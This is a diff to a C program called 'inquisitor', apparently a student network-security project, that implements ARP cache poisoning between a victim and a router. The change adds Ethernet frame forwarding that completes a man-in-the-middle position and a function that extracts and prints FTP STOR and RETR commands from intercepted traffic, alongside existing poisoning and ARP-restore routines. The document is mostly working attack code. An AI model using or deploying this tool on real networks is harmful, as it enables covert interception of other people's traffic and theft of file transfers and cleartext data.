@@ -2,6 +2,7 @@
 //eliminar luego
 #include "include/inquisitor.h"
 
+#include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -83,7 +84,7 @@ static int raw_socket()
 	return (sock_fd);
 }
 
-static int send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
+static int send_data(int sock, int index, void *data, size_t len, unsigned char *dest_mac) 
 {
 	struct sockaddr_ll sll;
 
@@ -94,7 +95,7 @@ static int send_packet(int sock, int index, struct arp_packet *pkt, unsigned cha
 
 	memcpy(sll.sll_addr, dest_mac, ETH_ALEN);
 
-	if (sendto(sock, pkt, sizeof(struct arp_packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
+	if (sendto(sock, data, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
 		return (0);
 	return (1);
 }
@@ -148,11 +149,15 @@ static void get_access_point_mac(int socket, unsigned int *index, t_session sess
 	char *name = get_nic(ifaddr);
 	*index = if_nametoindex(name);           
 	first.src.ip = session.dst.ip;
-	memcpy(first.dst.mac, session.dst.mac, 6);
+	memcpy(first.src.mac, session.dst.mac, 6);
 	first.dst.ip = session.src.ip;
 	memset(first.dst.mac, 0, 6);
+			//session -> src -> ip victim  
+			//session -> src -> mac attacker 
+			//session -> dst -> ip router  
+			//session -> dst -> mac router 
 	fill_arp_request(first, &pkt, ARPOP_REQUEST);
-	if (send_packet(socket, *index, &pkt, pkt.eth.h_dest) == 0)
+	if (send_data(socket, *index, &pkt, sizeof(struct arp_packet), pkt.eth.h_dest) == 0)
 	{
 		cleaning(socket, ifaddr);
 		error("Failed to send");
@@ -180,7 +185,7 @@ static void arp_restore(int sock, int index, t_session session, t_pair access_po
 	//session -> dst -> ip router  
 	//session -> dst -> mac router 
 	fill_arp_request(session, &victim_packet, ARPOP_REPLY);
-	send_packet(sock, index, &victim_packet, session.dst.mac);
+	send_data(sock, index, &victim_packet, sizeof(struct arp_packet), session.dst.mac);
 
 	router_session.src.ip = session.dst.ip;
 	memcpy(router_session.src.mac, session.dst.mac, 6);
@@ -192,7 +197,46 @@ static void arp_restore(int sock, int index, t_session session, t_pair access_po
 	//router_session -> dst -> ip victim  
 	//router_session -> dst -> mac victim 
 	fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
-	send_packet(sock, index, &router_packet, router_session.dst.mac);
+	send_data(sock, index, &router_packet, sizeof(struct arp_packet) ,router_session.dst.mac);
+}
+
+static void forwarding(int sock, int index, unsigned char *buffer, ssize_t bytes, t_session session, t_pair victim)
+{
+	struct ethhdr *eth = (struct ethhdr *)buffer;
+	struct sockaddr_ll socket_address;
+
+	if (memcmp(eth->h_dest, session.src.mac, 6) == 0) 
+		{
+			//SERVER->VICTIM
+			if (memcmp(eth->h_source, session.dst.mac, 6) == 0) {
+				memcpy(eth->h_source, session.src.mac, 6); // MAC attacker
+				memcpy(eth->h_dest, victim.mac, 6);      // MAC victim 
+			}
+			//VICTIM->SERVER
+			else if (memcmp(eth->h_source, victim.mac, 6) == 0) {
+				memcpy(eth->h_source, session.src.mac, 6); //MAC attacker 
+				memcpy(eth->h_dest, session.dst.mac, 6);   //MAC router 
+			}
+			memcpy(socket_address.sll_addr, eth->h_dest, 6);
+			send_data(sock, index, buffer, bytes, eth->h_dest);
+		}
+}
+
+static void snoop_payload(unsigned char *buffer, struct iphdr *ip, ssize_t bytes)
+{
+	struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + (ip->ihl * 4));
+
+			//calculo dónde empiezan los datos del FTP
+			unsigned char *payload = (unsigned char *)tcp + (tcp->th_off * 4);
+			int payload_size = bytes - (sizeof(struct ethhdr) + (ip->ihl * 4) + (tcp->th_off * 4));
+
+			if (payload_size > 0)
+			{
+				if (memmem(payload, payload_size, "STOR ", 5))
+					printf("\033[1;31m[INQUISITOR] DETECTADO 'PUT': %.*s\033[0m", payload_size, payload);
+				else if (memmem(payload, payload_size, "RETR ", 5))
+					printf("\033[1;34m[INQUISITOR] DETECTADO 'GET': %.*s\033[0m", payload_size, payload);
+			}
 }
 
 static void poisoning(int sock, int index, t_session session, t_pair access_point)
@@ -222,14 +266,14 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 			//session -> dst -> mac router 
 			//access_point -> mac victim
 			fill_arp_request(session, &victim_packet, ARPOP_REPLY);
-			send_packet(sock, index, &victim_packet, access_point.mac);
+			send_data(sock, index, &victim_packet, sizeof(struct arp_packet), access_point.mac);
 			//POISON ROUTER 
 			//router_session -> src -> ip router  
 			//router_session -> src -> mac attacker 
 			//router_session -> dst -> ip victim  
 			//router_session -> dst -> mac victim 
 			fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
-			send_packet(sock, index, &router_packet, session.dst.mac);
+			send_data(sock, index, &router_packet, sizeof(struct arp_packet), session.dst.mac);
 			last_poison = now;
 		}
 
@@ -237,23 +281,17 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 		struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
 
 		if (ip->protocol == IPPROTO_TCP) 
-		{
-			struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + (ip->ihl * 4));
-
-			//calculo dónde empiezan los datos del FTP
-			unsigned char *payload = (unsigned char *)tcp + (tcp->th_off * 4);
-			int payload_size = bytes - (sizeof(struct ethhdr) + (ip->ihl * 4) + (tcp->th_off * 4));
-
-			if (payload_size > 0)
-			{
-				if (memmem(payload, payload_size, "STOR ", 5))
-					printf("\033[1;31m[INQUISITOR] DETECTADO 'PUT': %.*s\033[0m", payload_size, payload);
-				else if (memmem(payload, payload_size, "RETR ", 5))
-					printf("\033[1;34m[INQUISITOR] DETECTADO 'GET': %.*s\033[0m", payload_size, payload);
-			}
-		}
+			snoop_payload(buffer, ip, bytes);
+		forwarding(sock, index, buffer, bytes, session, access_point);
 	}
 	arp_restore(sock, index, session, access_point);
+	//CHECK ARP RESTORE
+	// loop = 42;
+	// while (loop)
+	// {
+	// 	sleep(2);
+	// 	printf("check if is clean :D! ip neigh show\n");
+	// }
 }
 
 //signal handler
@@ -261,6 +299,7 @@ static void loop_handler(int sig)
 {
 	loop = 0;
 	(void)sig;
+	printf("\n");
 }
 
 int main (int ac, char *av[])
